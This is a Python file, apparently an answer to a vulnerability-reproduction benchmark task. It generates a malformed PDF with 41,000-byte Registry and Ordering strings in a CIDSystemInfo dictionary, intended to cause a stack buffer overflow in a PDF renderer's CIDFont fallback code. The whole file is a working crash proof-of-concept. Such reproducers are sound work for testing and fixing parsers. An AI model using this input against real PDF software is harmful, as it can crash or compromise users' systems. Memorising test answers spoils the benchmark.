import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Stack Buffer Overflow in the CIDFont fallback mechanism.
        # It occurs when constructing a fallback name "<Registry>-<Ordering>" from CIDSystemInfo.
        # To trigger this, we generate a PDF with a CIDFont containing a CIDSystemInfo dictionary
        # with extremely long Registry and Ordering strings.
        
        # Ground truth is ~80KB. We generate a payload ensuring > 64KB to overflow potential 
        # large stack buffers (e.g. 64KB buffers), while staying close to the ground truth magnitude.
        
        # We use 'A' as the payload character.
        payload_chunk = b"A" * 41000
        
        # Construct the PDF
        # We define a minimal PDF with a Type0 font that references a CIDFont (Type2).
        # The CIDFont references a CIDSystemInfo dictionary containing the payload.
        # The BaseFont is set to a dummy name to trigger the fallback lookup logic.
        
        pdf_content = (
            b"%PDF-1.7\n"
            # Catalog
            b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
            # Pages
            b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
            # Page
            b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
            b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>\nendobj\n"
            # Type0 Font
            b"4 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont /ExploitFont "
            b"/Encoding /Identity-H /DescendantFonts [6 0 R] >>\nendobj\n"
            # Content Stream (Trigger rendering/font load)
            b"5 0 obj\n<< /Length 26 >>\nstream\nBT /F1 12 Tf (Pwn) Tj ET\nendstream\nendobj\n"
            # CIDFont (Descendant)
            b"6 0 obj\n<< /Type /Font /Subtype /CIDFontType2 /BaseFont /ExploitCID "
            b"/CIDSystemInfo 7 0 R /FontDescriptor 8 0 R >>\nendobj\n"
            # CIDSystemInfo (Payload Here)
            # The vulnerable code likely concatenates Registry and Ordering.
            b"7 0 obj\n<< /Registry (" + payload_chunk + b") "
            b"/Ordering (" + payload_chunk + b") /Supplement 0 >>\nendobj\n"
            # FontDescriptor (Minimal valid descriptor)
            b"8 0 obj\n<< /Type /FontDescriptor /FontName /ExploitCID /Flags 4 "
            b"/FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent -200 "
            b"/CapHeight 1000 /StemV 80 >>\nendobj\n"
            # Trailer
            b"trailer\n<< /Root 1 0 R >>\n%%EOF\n"
        )
        
        return pdf_content
